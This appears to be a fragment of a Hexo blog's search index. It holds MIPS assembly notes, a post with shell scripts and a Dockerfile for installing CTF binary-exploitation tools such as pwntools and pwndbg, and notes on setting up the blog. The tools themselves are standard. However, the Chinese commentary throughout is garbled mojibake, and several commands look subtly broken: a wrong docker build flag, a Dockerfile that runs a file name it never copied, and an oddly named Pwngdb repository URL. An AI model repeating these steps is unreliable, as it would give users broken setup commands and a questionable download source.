class="line"><span class="number">2</span><span class="number">-3</span>:   $<span class="built_in">v0</span>-<span class="built_in">v1</span>   <span class="comment"># value å‡½æ•°è¿”å›å€¼</span></span><br><span class="line"><span class="number">4</span><span class="number">-7</span>:   $<span class="built_in">a0</span>-<span class="built_in">a3</span>   <span class="comment"># arg  å‡½æ•°å‚æ•°</span></span><br><span class="line"><span class="number">8</span><span class="number">-15</span>:  $<span class="built_in">t0</span>-<span class="built_in">t7</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-23</span>: $<span class="built_in">s0</span>-<span class="built_in">s7</span>   <span class="comment"># save ä¿ç•™</span></span><br><span class="line"><span class="number">24</span><span class="number">-25</span>: $<span class="built_in">t8</span>-<span class="built_in">t9</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-27</span>: $<span class="built_in">k0</span>-<span class="built_in">k1</span>   <span class="comment"># å¼‚å¸¸æˆ–ä¸­æ–­</span></span><br><span class="line"><span class="number">28</span>:    $<span class="built_in">gp</span>      <span class="comment"># global pointer</span></span><br><span class="line"><span class="number">29</span>:    $<span class="built_in">sp</span>      <span class="comment"># stack pointer</span></span><br><span class="line"><span class="number">30</span>:    $<span class="built_in">fp</span>, <span class="built_in">s8</span>  <span class="comment"># frame pointer </span></span><br><span class="line"><span class="number">31</span>:    $<span class="built_in">ra</span>      <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; ç‰¹æ®Š</span></span><br><span class="line"><span class="symbol">pc:</span> program cunter</span><br></pre></td></tr></table></figure><ul><li>æŒ‡ä»¤æ ¼å¼</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r: register format <span class="comment"># ä½¿ç”¨å¯„å­˜å™¨</span></span><br><span class="line">i: immediate       <span class="comment"># ä½¿ç”¨ç«‹å³æ•°</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jump</span></span><br></pre></td></tr></table></figure><ul><li>å¯»å€</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>, $<span class="built_in">zero</span>    <span class="comment"># a0&lt;-0</span></span><br></pre></td></tr></table></figure><ul><li>è®¿é—®å†…å­˜</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä»ç„¶ load, store</span></span><br><span class="line"><span class="comment"># b: byte; w: word; h: half word; ...</span></span><br><span class="line"><span class="keyword">sw: </span><span class="keyword">sw </span>$<span class="built_in">ra</span>, <span class="number">0x38</span>($<span class="built_in">sp</span>)   <span class="comment"># å°†$raå­˜å…¥æ ˆä¸­ $sp+38çš„åœ°æ–¹</span></span><br><span class="line"><span class="keyword">sb: </span>...</span><br><span class="line"><span class="keyword">lw: </span>...</span><br><span class="line"><span class="keyword">lb: </span>...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¾‹å­</span></span><br><span class="line"><span class="keyword">sb </span>r1, <span class="number">0</span>(R2)</span><br><span class="line"><span class="keyword">lb </span>r1, <span class="number">0</span>(r2)</span><br></pre></td></tr></table></figure><ul><li>ç®—æœ¯</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; åŸºæœ¬ç®—æœ¯</span></span><br><span class="line"><span class="keyword">add</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sub</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; é€»è¾‘</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">xor</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">nor</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; ç§»ä½</span></span><br><span class="line"><span class="keyword">sll</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">srl</span></span><br></pre></td></tr></table></figure><ul><li>è·³è½¬</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; jmp</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jmp </span>label</span><br><span class="line"><span class="keyword">jr: </span>ç”¨æ³• <span class="keyword">jr </span>$<span class="built_in">ra</span> ç­‰</span><br><span class="line"><span class="keyword">jal: </span><span class="keyword">jmp </span><span class="keyword">and </span>link, ä¿å­˜ ret <span class="keyword">addr(pc+4) </span>åˆ° $<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">jalr: </span>å€Ÿç”¨å¯„å­˜å™¨è·³è½¬ï¼Œé“¾æ¥ï¼Œå¸¸ç”¨</span><br><span class="line"></span><br><span class="line"><span class="comment">; branch, åé¢éœ€è¦è·Ÿæ“ä½œ</span></span><br><span class="line"><span class="keyword">beq: </span><span class="keyword">beq </span>$s, $t, offset   <span class="comment"># $s=$tè·³è½¬</span></span><br><span class="line"><span class="keyword">bne: </span><span class="keyword">b </span>not eq</span><br><span class="line"><span class="keyword">bltz: </span><span class="keyword">branch </span>less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure><ul><li>æ¶æ„ç¼“å­˜<ul><li>æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„cache: æŒ‡ä»¤ å’Œ æ•°æ®</li></ul></li></ul><h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>xxx</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn init</title>
      <link href="/2023/06/05/Pwn%20init/"/>
      <url>/2023/06/05/Pwn%20init/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ­å»ºä¸€ä¸ªpwnç¯å¢ƒã€‚</p></blockquote><span id="more"></span><ul><li><code>apt</code> or <code>apt-get</code>? è™½ç„¶æˆ‘ä½¿ç”¨aptå‡ºç°warning,ä½†æ˜¯ä¾ç„¶èƒ½ç”¨<ul><li>åœ¨è„šæœ¬ä¸­ï¼Œæ›´åŠ æ¨è <code>apt-get</code></li><li><code>-y</code> yes é¿å…äº¤äº’è€Œäº§ç”Ÿé”™è¯¯</li></ul></li></ul><h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote><p>å®‰è£…å¿…å¤‡çš„åº”ç”¨</p></blockquote><ul><li>rootä¸‹ä½¿ç”¨ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·æ— æ³•ä½¿ç”¨<code>gdbæ’ä»¶</code>åŠŸèƒ½ï¼Œå› ä¸ºgdbinitæ–‡ä»¶çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ä¸€ä»½åˆ°è‡ªå·±çš„ç”¨æˆ·ç›®å½•ä¸‹</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># pythonå·¥å…·</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># æ¢æºï¼Œå¯é€‰</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gemæº</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker è‡ªå·±é€‰æ‹©</span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu è‡ªå·±é€‰æ‹©</span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul><li><p>æ­å»ºæ›´åŠ å®¹æ˜“</p></li><li><p>ç”±äºæŸäº›é¢˜ç›®æ²¡æœ‰Libcç‰ˆæœ¬ï¼Œè€Œæ˜¯ç»™å‡ºäº†Dockerfileã€‚æˆ–è€…è¯´ï¼Œä¸æƒ³ä¸‹è½½è™šæ‹Ÿæœºã€‚</p><ul><li>glibc-all-in-one ä¸‹è½½ä¸€ä¸ªlibc è¿›è¡Œpatch(ä½†æ˜¯<code>patchelf</code>å®¹æ˜“å¯¼è‡´ç¨‹åºç ´å).</li><li>è‡ªå·±çš„dockerç¯å¢ƒ</li></ul></li><li><p>dockerç¯å¢ƒæ­å»º: æ›´æ”¹VERSIONå°±è¡Œï¼Œç¦æ­¢äº¤äº’ã€‚</p></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># å®šä¹‰æ—¶åŒºå‚æ•°</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># è®¾ç½®æ—¶åŒº</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç¼–ç </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure><ul><li>pwninit: åªéœ€è¦å®‰è£…éƒ¨åˆ†å·¥å…·</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># æ¢æºï¼Œå¯é€‰</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ªå®¹å™¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f æŒ‡å®šdockerfile</span></span><br><span class="line"><span class="comment"># repo å½¢å¼ xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><ul><li>è¿›å…¥docker</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir å…±äº«æ–‡ä»¶å¤¹</span></span><br></pre></td></tr></table></figure><ul><li><p>docker å‘½ä»¤</p><ul><li>-i: äº¤äº’å¼</li><li>-t: terminl</li><li>-v hostDir:dockerDir å…±äº«æ–‡ä»¶å¤¹</li><li>ps -a: æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨</li></ul></li><li><p>åœæ­¢åé‡æ–°è®¡å…¥å®¹å™¨</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure><ul><li>åœæ­¢å®¹å™¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure><ul><li>åˆ é™¤å®¹å™¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure><ul><li>åˆ é™¤é•œåƒ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™å¤„ç†"><a href="#æŠ¥é”™å¤„ç†" class="headerlink" title="æŠ¥é”™å¤„ç†"></a>æŠ¥é”™å¤„ç†</h4><ul><li>error 1</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure><ul><li>error 2</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure><ul><li><p>å‡ºç°äº†å¦‚ä¸Šé”™è¯¯ã€‚å¯»æ‰¾åˆ°ä¸€ä¸ª<a href="https://github.com/pwndbg/pwndbg/issues/1539">issue</a></p></li><li><p>error1ï¼Œä¿®æ”¹dockerfileçš„ç±»ä¼¼å¦‚ä¸‹å˜é‡ã€‚é€‰æ‹©ä¸­å›½</p></li><li><p>error2  ä¹Ÿè§£å†³äº†ã€‚</p></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘ä»¬çš„è®¾ç½®</span></span><br><span class="line"><span class="comment"># å®šä¹‰æ—¶åŒºå‚æ•°</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># è®¾ç½®æ—¶åŒº</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç¼–ç </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><ul><li>åˆ›å»ºå¤šä¸ªdockerã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>init-blog</title>
      <link href="/2023/03/19/init-blog/"/>
      <url>/2023/03/19/init-blog/</url>
      
        <content type="html"><![CDATA[<blockquote><p>blog init</p></blockquote><span id="more"></span><h1 id="æ­å»ºåšå®¢"><a href="#æ­å»ºåšå®¢" class="headerlink" title="æ­å»ºåšå®¢"></a>æ­å»ºåšå®¢</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>github + hexo</li></ul><!--more--><h3 id="hexoä½¿ç”¨"><a href="#hexoä½¿ç”¨" class="headerlink" title="hexoä½¿ç”¨"></a>hexoä½¿ç”¨</h3><ul><li><p><code>hexo</code> å‘½ä»¤æŠ¥é”™ï¼Œä¸Šç½‘æŸ¥ï¼Œä½¿ç”¨ <code>npx hexo</code></p></li><li><p>æ’ä»¶ä¸‹è½½</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><ul><li>å¸¸ç”¨å‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npx hexo init <span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªä»“åº“</span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># é™æ€ç•Œé¢ç”Ÿæˆ</span></span><br><span class="line">npx hexo s   <span class="comment"># æœ¬åœ°å¯åŠ¨ service</span></span><br><span class="line">npx hexo d   <span class="comment"># æ’ä»¶ã€‚ä¼ åˆ°github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># ç”Ÿæˆç›®å½•</span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#ç”Ÿæˆæ–‡ç« </span></span><br></pre></td></tr></table></figure><ul><li>å¸¸ç”¨å±æ€§</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title: æ ‡é¢˜ï¼Œ ä½¿ç”¨ &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: æ—¥æœŸ, ä½¿ç”¨ &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: æ›´æ–°</span><br><span class="line">tags: æ ‡ç­¾</span><br><span class="line">categories: åˆ†ç±»</span><br><span class="line">comments: å¼€å¯è¯„è®º <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h3><ul><li>obsidian å†™md</li><li>vscode</li></ul><h2 id="æŒç»­å­¦ä¹ "><a href="#æŒç»­å­¦ä¹ " class="headerlink" title="æŒç»­å­¦ä¹ "></a>æŒç»­å­¦ä¹ </h2><ul><li>ç®€å•ç‚¹ä¹Ÿè¿˜è¡Œï¼Œä¸æƒ³æŠ˜è…¾äº†ã€‚</li><li>å®˜ç½‘ + googleï¼Œæ»¡è¶³ä¸€åˆ‡è¦æ±‚</li></ul><p><a href="https://hexo.io/zh-cn/docs/">ä¸­æ–‡æ–‡æ¡£</a></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
